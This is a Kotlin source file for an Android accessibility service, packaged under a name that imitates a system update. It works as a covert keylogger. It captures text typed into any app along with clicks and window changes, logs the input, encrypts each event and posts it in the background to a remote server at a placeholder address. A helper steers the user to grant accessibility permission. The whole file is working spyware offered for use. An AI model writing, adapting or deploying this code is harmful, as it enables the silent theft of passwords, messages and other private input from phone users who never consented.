package com.system.updates.modules.network

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import org.json.JSONObject

class InputMonitor : AccessibilityService() {

    private lateinit var crypto: CryptoManager
    private lateinit var network: NetworkUtils
    private val tag = "InputMonitor"

    override fun onCreate() {
        super.onCreate()
        crypto = CryptoManager(this)
        network = NetworkUtils(this)
        Log.d(tag, "InputMonitor service created")
    }

    override fun onServiceConnected() {
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_SCROLLED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        serviceInfo = info
        Log.d(tag, "InputMonitor connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = event.eventType
        val packageName = event.packageName?.toString() ?: "unknown"
        val className = event.className?.toString() ?: "unknown"
        val source = event.source
        val text = if (source != null && source.text != null) source.text.toString() else ""

        val data = JSONObject().apply {
            put("type", eventType)
            put("package", packageName)
            put("class", className)
            put("text", text)
            put("timestamp", System.currentTimeMillis())
        }

        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                Log.d(tag, "Clicked: $packageName/$className")
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (text.isNotEmpty()) {
                    Log.d(tag, "Text input: $text")
                }
            }
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                Log.d(tag, "Scrolled: $packageName")
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                Log.d(tag, "Window changed: $className")
            }
        }

        if (text.isNotEmpty() || eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            sendEncrypted(data.toString())
        }
    }

    override fun onInterrupt() {
        Log.w(tag, "InputMonitor interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(tag, "InputMonitor destroyed")
    }

    private fun sendEncrypted(payload: String) {
        val key = crypto.deriveDeviceKey()
        val iv = java.security.SecureRandom().generateSeed(12)
        val cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, javax.crypto.spec.SecretKeySpec(key, "AES"), javax.crypto.spec.GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(payload.toByteArray())
        val full = iv + encrypted
        val b64 = android.util.Base64.encodeToString(full, android.util.Base64.NO_WRAP)

        Thread {
            try {
                network.httpPost("https://your-server.com/input", "data=$b64")
            } catch (e: Exception) {
                Log.e(tag, "Send failed", e)
            }
        }.start()
    }

    companion object {
        fun isAccessibilityEnabled(context: Context, serviceClass: Class<*>): Boolean {
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            return enabled?.contains(context.packageName + "/" + serviceClass.canonicalName) ?: false
        }

        fun requestAccessibilityPermission(context: Context) {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        }
    }
}